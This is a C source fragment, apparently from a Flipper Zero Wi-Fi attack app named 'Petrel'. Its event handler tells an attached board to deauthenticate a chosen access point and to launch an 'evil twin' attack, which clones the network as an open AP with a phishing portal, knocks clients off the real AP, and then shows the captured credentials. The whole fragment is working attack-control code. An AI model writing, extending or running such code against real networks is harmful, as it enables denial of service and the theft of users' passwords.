bool info_wifi_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;
    char cadena[24] = "";
    switch(event.event) {
    case PETREL_EVT_INFO_DEAUTH:
        FURI_LOG_D(TAG, "%s deauth", __func__);
        if(app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) return true;
        {
            // Send idAP, not selectedWifi: the list is sorted by RSSI here, while the board's
            // DEAUTH/STOP handlers index their own unsorted scan_results with the number we send.
            int id = app->wifiList[app->selectedWifi].idAP;
            if(app->wifiList[app->selectedWifi].deauth == false) {
                app->wifiList[app->selectedWifi].deauth = true;
                snprintf(cadena, sizeof(cadena), "DEAUTH %d\n", id);
            } else {
                app->wifiList[app->selectedWifi].deauth = false;
                snprintf(cadena, sizeof(cadena), "STOP %d\n", id);
            }
        }
        info_wifi_scene_on_enter(app);
        uart_helper_send(app->uart_helper, cadena, strlen(cadena));
        return true;
    case PETREL_EVT_INFO_EVIL:
        // Clone the selected AP (SSID + channel) as an open AP with the selected portal and deauth
        // the real one, then show the credential screen. The board brings the AP up through its
        // cooperative lifecycle, so loop() stays responsive.
        FURI_LOG_D(TAG, "%s evil", __func__);
        if(app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) return true;
        {
            int id = app->wifiList[app->selectedWifi].idAP;
            app->wifiList[app->selectedWifi].deauth = true;
            snprintf(cadena, sizeof(cadena), "EVIL %d\n", id);
            uart_helper_send(app->uart_helper, cadena, strlen(cadena));
            scene_manager_next_scene(app->scene_manager, evilCredsScene);
        }
        return true;
    case PETREL_EVT_INFO_EDIT:
        FURI_LOG_D(TAG, "%s edit", __func__);
        scene_manager_next_scene(app->scene_manager, configAttackScene);
        return true;
    }
    return false;
}
